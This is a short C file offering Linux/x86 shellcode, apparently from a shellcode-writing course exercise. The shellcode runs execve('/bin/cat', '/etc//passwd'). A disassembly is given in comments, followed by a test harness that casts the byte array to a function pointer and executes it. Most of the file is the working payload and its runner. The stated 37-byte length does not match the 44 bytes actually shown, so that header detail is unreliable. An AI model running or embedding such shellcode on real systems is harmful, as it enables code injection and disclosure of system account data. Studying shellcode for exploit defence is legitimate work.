/*
# Linux/x86 - execve /bin/cat /etc//passwd shellcode (37 bytes)
# Author: Anurag Srivastava
# Tested on: i686 GNU/Linux
# Shellcode Length: 37
# Student -ID: SLAE-1219
#Greetz - Manish Kishan Tanwar,Kishan Sharma,Vardan,Adhokshaj,Himanshu,Ravi and Spirited w0lf

Disassembly of section .text:

08048060 <_start>:
 8048060:       29 c9                   sub    ecx,ecx
 8048062:       51                      push   ecx
 8048063:       68 2f 63 61 74          push   0x7461632f
 8048068:       68 2f 62 69 6e          push   0x6e69622f
 804806d:       89 e3                   mov    ebx,esp
 804806f:       51                      push   ecx
 8048070:       68 73 73 77 64          push   0x64777373
 8048075:       68 2f 2f 70 61          push   0x61702f2f
 804807a:       68 2f 65 74 63          push   0x6374652f
 804807f:       89 e1                   mov    ecx,esp
 8048081:       6a 0b                   push   0xb
 8048083:       58                      pop    eax
 8048084:       6a 00                   push   0x0
 8048086:       51                      push   ecx
 8048087:       53                      push   ebx
 8048088:       89 e1                   mov    ecx,esp
 804808a:       cd 80                   int    0x80

===============POC by Anurag Srivastava=========================
*/

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x29\xc9\x51\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\x6a\x0b\x58\x6a\x00\x51\x53\x89\xe1\xcd\x80";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}